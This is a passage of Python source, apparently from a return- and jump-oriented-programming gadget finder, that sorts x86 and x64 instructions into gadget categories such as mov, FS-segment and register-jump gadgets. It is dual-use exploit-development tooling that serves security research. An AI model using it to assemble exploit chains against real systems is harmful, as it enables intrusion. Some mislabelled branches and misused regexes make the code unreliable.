				elif re.match( r'^xor esi, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFSESI)
				elif re.match( r'^xor ebp, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFSEBP)
				elif re.match( r'^xor esp, dword ptr fs', testVal, re.M|re.I):
					obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.xorFSESP)
			try:
				if obj!=False:
					fsReg=getFSIndex(obj)
					obj.setFSIndex(fsReg)
			except:
				pass

	def do_mov(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if re.match( r'^mov [e]*[abcds]+[xlspbi]+, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
			# if not re.match( r'^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h]*|^mov [e]*b[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*b[x|l|h]+|^mov [e]*c[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*c[x|l|h]*|^mov [e]*d[x|l|h]+, [dword|byte|word]+ [ptr]* \[[e]*d[x|l|h]+|^mov [e]*di, [dword|byte|word]+ [ptr]* \[[e]*di|^mov [e]*si, [dword|byte|word]+ [ptr]* \[[e]*si|^mov [e]*sp, [dword|byte|word]+ [ptr]* \[[e]*sp|^mov [e]*bp, [dword|byte|word]+ [ptr]* \[[e]*bp|mov [e]*a[x|l]+, [e]*a[x|l|h]+|mov [e]*b[x|l]+, [e]*b[x|l|h]+|mov [e]*c[x|l|h]+, [e]*c[x|l|h]+|mov [e]*d[x|l]+, [e]*d[x|l|h]+|mov [e]*di, [e]*di|mov [e]*si, [e]*si|mov [e]*bp, [e]*bp+|mov [e]*sp, [e]*sp|^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h] [+|-]+|^mov [dword|byte|word]+ ptr \[[e]*[abcdspb]+[x|l|h|i|p]+ [+|-]+ |^mov [e]*[abcdspb]+[x|l|i|p]+, [dword|byte|word]+ ptr \[0x|^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h]+ [+|-]+|^mov [e]*[abcdspb]+[x|l|i|p]+, es', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.mov)
			if re.match( r'^mov [e]*a[x|l]+, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.movEAX)
			elif re.match( r'^mov [e]*b[x|l]+, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.movEBX)
			elif re.match( r'^mov [e]*c[x|l]+, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.movECX)
			elif re.match( r'^mov [e]*d[x|l]+, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.movEDX)
			elif re.match( r'^mov [e]*si, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.movESI)
			elif re.match( r'^mov [e]*di, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.movEDI)
			elif re.match( r'^mov [e]*sp, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movESP)
			elif re.match( r'^mov [e]*bp, [e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.movEBP)
		elif re.match( r'^mov [e]*[abcds]+[xlspbi]+, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
			# if not re.match( r'^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h]*|^mov [e]*b[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*b[x|l|h]+|^mov [e]*c[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*c[x|l|h]*|^mov [e]*d[x|l|h]+, [dword|byte|word]+ [ptr]* \[[e]*d[x|l|h]+|^mov [e]*di, [dword|byte|word]+ [ptr]* \[[e]*di|^mov [e]*si, [dword|byte|word]+ [ptr]* \[[e]*si|^mov [e]*sp, [dword|byte|word]+ [ptr]* \[[e]*sp|^mov [e]*bp, [dword|byte|word]+ [ptr]* \[[e]*bp|mov [e]*a[x|l]+, [e]*a[x|l|h]+|mov [e]*b[x|l]+, [e]*b[x|l|h]+|mov [e]*c[x|l|h]+, [e]*c[x|l|h]+|mov [e]*d[x|l]+, [e]*d[x|l|h]+|mov [e]*di, [e]*di|mov [e]*si, [e]*si|mov [e]*bp, [e]*bp+|mov [e]*sp, [e]*sp|^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h] [+|-]+|^mov [dword|byte|word]+ ptr \[[e]*[abcdspb]+[x|l|h|i|p]+ [+|-]+ |^mov [e]*[abcdspb]+[x|l|i|p]+, [dword|byte|word]+ ptr \[0x|^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h]+ [+|-]+|^mov [e]*[abcdspb]+[x|l|i|p]+, es', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.movDword2)
			#   mov eax, dword ptr [eax]
			if re.match( r'^mov [e]*a[x|l]+, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.movDword2EAX)
			elif re.match( r'^mov [e]*b[x|l]+, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.movDword2EBX)
			elif re.match( r'^mov [e]*c[x|l]+, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.movDword2ECX)
			elif re.match( r'^mov [e]*d[x|l]+, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.movDword2EDX)
			elif re.match( r'^mov [e]*si, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.movDword2ESI)
			elif re.match( r'^mov [e]*di, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.movDword2EDI)
			elif re.match( r'^mov [e]*sp, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movDword2ESP)
			elif re.match( r'^mov [e]*bp, dword ptr \[[e]*[abcdspb]+[x|l|h|i|p]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.movDword2EBP)
		elif re.match( r'^mov [e]*[abcds]+[xlspbi]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
			# if not re.match( r'^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h]*|^mov [e]*b[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*b[x|l|h]+|^mov [e]*c[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*c[x|l|h]*|^mov [e]*d[x|l|h]+, [dword|byte|word]+ [ptr]* \[[e]*d[x|l|h]+|^mov [e]*di, [dword|byte|word]+ [ptr]* \[[e]*di|^mov [e]*si, [dword|byte|word]+ [ptr]* \[[e]*si|^mov [e]*sp, [dword|byte|word]+ [ptr]* \[[e]*sp|^mov [e]*bp, [dword|byte|word]+ [ptr]* \[[e]*bp|mov [e]*a[x|l]+, [e]*a[x|l|h]+|mov [e]*b[x|l]+, [e]*b[x|l|h]+|mov [e]*c[x|l|h]+, [e]*c[x|l|h]+|mov [e]*d[x|l]+, [e]*d[x|l|h]+|mov [e]*di, [e]*di|mov [e]*si, [e]*si|mov [e]*bp, [e]*bp+|mov [e]*sp, [e]*sp|^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h] [+|-]+|^mov [dword|byte|word]+ ptr \[[e]*[abcdspb]+[x|l|h|i|p]+ [+|-]+ |^mov [e]*[abcdspb]+[x|l|i|p]+, [dword|byte|word]+ ptr \[0x|^mov [e]*a[x|l]+, [dword|byte|word]+ [ptr]* \[[e]*a[x|l|h]+ [+|-]+|^mov [e]*[abcdspb]+[x|l|i|p]+, es', testVal, re.M|re.I):
			#add
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.movConstant)
			if re.match( r'^mov [e]*a[x|l]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [e]*ax, [e]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.movConstantEAX)
			elif re.match( r'^mov [e]*b[x|l]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [e]*bx, [e]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.movConstantEBX)
			elif re.match( r'^mov [e]*c[x|l]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [e]*cx, [e]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.movConstantECX)
			elif re.match( r'^mov [e]*d[x|l]+, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [e]*dx, [e]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.movConstantEDX)
			elif re.match( r'^mov [e]*si, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [e]*si, [e]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.movConstantESI)
			elif re.match( r'^mov [e]*di, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [e]*di, [e]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.movConstantEDI)
			elif re.match( r'^mov [e]*sp, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [e]*sp, [e]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movConstantESP)
			elif re.match( r'^mov [e]*bp, [0-9]*[0x]*[0-9a-f]+', testVal, re.M|re.I):
				if not re.match( r'^mov [e]*bp, [e]*[abcds]+[xipb]+', testVal, re.M|re.I):
					addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.movConstantEBP)
		#mov dword
		# elif re.match( r'^mov dword ptr \[[e]*', testVal, re.M|re.I):
		elif "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.movDword)
			if re.match( r'^mov dword ptr \[[e]*a[x|l]+.*\], [e]*[abcdsb]+|^mov dword ptr \[[e]*a[x|l]+.*\], [dword|word|byte]* ptr \[[e]*[abcdsb]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.movDwordEAX)
			elif re.match( r'^mov dword ptr \[[e]*b[x|l]+.*\], [e]*[abcdsb]+|^mov dword ptr \[[e]*b[x|l]+.*\], [dword|word|byte]* ptr \[[e]*[abcdsb]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.movDwordEBX)
			elif re.match( r'^mov dword ptr \[[e]*c[x|l]+.*\], [e]*[abcdsb]+|^mov dword ptr \[[e]*c[x|l]+.*\], [dword|word|byte]* ptr \[[e]*[abcdsb]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.movDwordECX)
			elif re.match( r'^mov dword ptr \[[e]*d[x|l]+.*\], [e]*[abcdsb]+|^mov dword ptr \[[e]*d[x|l]+.*\], [dword|word|byte]* ptr \[[e]*[abcdsb]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.movDwordEDX)
			elif re.match( r'^mov dword ptr \[[e]*di.*\], [e]*[abcdsb]+|^mov dword ptr \[[e]*di.*\], [dword|word|byte]* ptr \[[e]*[abcdsb]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.movDwordEDI)
			elif re.match( r'^mov dword ptr \[[e]*si.*\], [e]*[abcdsb]+|^mov dword ptr \[[e]*si.*\], [dword|word|byte]* ptr \[[e]*[abcdsb]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.movDwordESI)
			elif re.match( r'^mov dword ptr \[[e]*bp.*\], [e]*[abcdsb]+|^mov dword ptr \[[e]*bp.*\], [dword|word|byte]* ptr \[[e]*[abcdsb]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.movDwordEBP)
			elif re.match( r'^mov dword ptr \[[e]*sp.*\], [e]*[abcdsb]+|^mov dword ptr \[[e]*sp.*\], [dword|word|byte]* ptr \[[e]*[abcdsb]+', testVal, re.M|re.I):
				addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movDwordESP)
		if "fs:[e" in testVal or "fs:[0xc0]" in testVal:
			if re.match( r'^mov [e]*[abcdsibpbx]+, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFS)
			if re.match( r'^mov eax, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFSEAX)
			elif re.match( r'^mov ebx, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFSEBX)
				# if obj!=False:
				# 	fsReg=getFSIndex(obj)
				# 	obj.setFSIndex(fsReg)
			elif re.match( r'^mov ecx, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFSECX)
				# if obj!=False:
				# 	fsReg=getFSIndex(obj)
				# 	print ("special fsreg",fsReg)
			elif re.match( r'^mov edx, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFSEDX)
			elif re.match( r'^mov edi, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFSEDI)
			elif re.match( r'^mov esi, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFSESI)
			elif re.match( r'^mov ebp, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFSEBP)
			elif re.match( r'^mov esp, dword ptr fs', testVal, re.M|re.I):
				obj=addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.movFSESP)
			try:
				if obj!=False:
					fsReg=getFSIndex(obj)
					obj.setFSIndex(fsReg)
			except:
				pass




	def do_popal(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.popal)
	def do_popad(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_popal(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)
	
	def do_pushal(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.pushad)
	def do_pushad(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_pushal(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)
	
	def do_sal(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_shl(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do_shl(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.shlDword)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.shl)

	def do_shr(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.shrDword)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.shr)


	def do_sar(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_shr(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)


	def do_rcr(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.rcrDword)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.rcr)

	def do_ror(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_rcr(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do_rcl(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		if "ptr" in testVal:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.rclDword)
		else:
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.rcl)

	def do_rol(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		self.do_rcl(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL,  op_strL, c2)

	def do_not(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.notInst)
		if re.match( r'^not [e]*a[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.notInstEAX)
		elif re.match( r'^not [e]*b[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.notInstEBX)
		elif re.match( r'^not [e]*c[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.notInstECX)
		elif re.match( r'^not [e]*d[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.notInstEDX)
		elif re.match( r'^not [e]*si', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.notInstESI)
		elif re.match( r'^not [e]*di', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.notInstEDI)
		elif re.match( r'not [e]*sp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.notInstESP)
		elif re.match( r'^not [e]*bp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.notInstEBP)

	def do_and(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.andInst)
		if re.match( r'^and [e]*a[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, eax, fg.andInstEAX)
		elif re.match( r'^and [e]*b[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebx, fg.andInstEBX)
		elif re.match( r'^and [e]*c[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ecx, fg.andInstECX)
		elif re.match( r'^and [e]*d[x|l|h]+', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edx, fg.andInstEDX)
		elif re.match( r'^and [e]*si', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esi, fg.andInstESI)
		elif re.match( r'^and [e]*di', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, edi, fg.andInstEDI)
		elif re.match( r'and [e]*sp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, esp, fg.andInstESP)
		elif re.match( r'^and [e]*bp', testVal, re.M|re.I):
			addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, ebp, fg.andInstEBP)

	def do_unusual(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.unusual)

	def do_fs(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("do func fs")
		addGadget(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.fs)
	def do_go_fs(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2=False):
		dp("do_go_fs")
		addGadgetNoCheck(saveq, pe,n,offL[lGoBack],op_str, raw, n, c2, None, fg.fsSpecial)



		#######################################################################################
		## 64-bit RE follows:
		#######################################################################################

	def do64Jmp(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL,c2,jmp=False):
		check1=raw.hex()+hex(saveq)
		if (check1) not in fg.junkBox64:
			do = f"go64_{name}"
			if hasattr(self, do) and callable(func := getattr(self, do)):
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("go func64", name, hex(offL[lGoBack]))
				fg.junkBox64.add(check1)

	def do64(self, name: str, testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL,c2=False):
		check1=raw.hex()+hex(saveq)
		if (check1) not in fg.junkBox and "ret" != name:
			do = f"do64_{name}"
			if hasattr(self, do) and callable(func := getattr(self, do)):
				obj=func(testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2)
				dp("do func64", name, hex(offL[lGoBack]))
				fg.junkBox64.add(check1)	
	def go64_jmp(self,testVal,saveq, offL,op_str,lGoBack, n, raw,mnemonicL, op_strL, c2):
		if "qword" not in testVal:
			if re.match( r'\bjmp rsi\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rsi", fg.jmpRSI)
			elif re.match( r'\bjmp rbp\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rbp", fg.jmpRBP)
			elif re.match( r'\bjmp rdi\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdi", fg.jmpRDI)
			elif re.match( r'^jmp rax',testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rax", fg.jmpRAX)
			elif re.match( r'^jmp rbx', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rbx", fg.jmpRBX)
			elif re.match( r'\bjmp rsp\b',testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rsp", fg.jmpRSP)	
			elif re.match( r'\bjmp rcx\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rcx", fg.jmpRCX)
			elif re.match( r'\bjmp rdx\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpRDX)
			elif re.match( r'\bjmp r8\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpR8)
			elif re.match( r'\bjmp r9\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpR9)
			elif re.match( r'\bjmp r10\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpR10)
			elif re.match( r'\bjmp r11\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpR11)
			elif re.match( r'\bjmp r12\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpR12)
			elif re.match( r'\bjmp r13\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpR13)
			elif re.match( r'\bjmp r14\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpR14)
			elif re.match( r'\bjmp r15\b', testVal, re.M|re.I):
				addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdx", fg.jmpR15)
		else:
			if "[rbp" in testVal:
				if "jmp qword ptr [rbp]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rbp", fg.jmpQwordRBP)
				elif re.match( r'jmp qword ptr \[rbp [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rbp", fg.jmpQwordOffsetRBP,offVal)
			elif "[rsp" in testVal:
				if "jmp qword ptr [rsp]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rsp", fg.jmpQwordRSP)
				elif re.match( r'jmp qword ptr \[rsp [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rsp", fg.jmpQwordOffsetRSP,offVal)
			elif "[rdi" in testVal:
				if "jmp qword ptr [rdi]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdi", fg.jmpQwordRDI)
				elif re.match( r'jmp qword ptr \[rdi [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rdi", fg.jmpQwordOffsetRDI,offVal)
			elif "[rsi" in testVal:
				if "jmp qword ptr [rsi]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rsi", fg.jmpQwordRSI)
				elif re.match( r'jmp qword ptr \[rsi [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
						addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rsi", fg.jmpQwordOffsetRSI,offVal)
			elif "[rax" in testVal:
				if "jmp qword ptr [rax]" in testVal:
					addGadgetJmp(saveq, pe,n,offL[lGoBack],op_str, raw, n, "jmp", "rax", fg.jmpQwordRAX)
				elif re.match( r'jmp qword ptr \[rax [+|-]+', testVal, re.M|re.I):
					foundOffset,offVal=self.extractOffset(op_strL[lGoBack])
					if foundOffset:
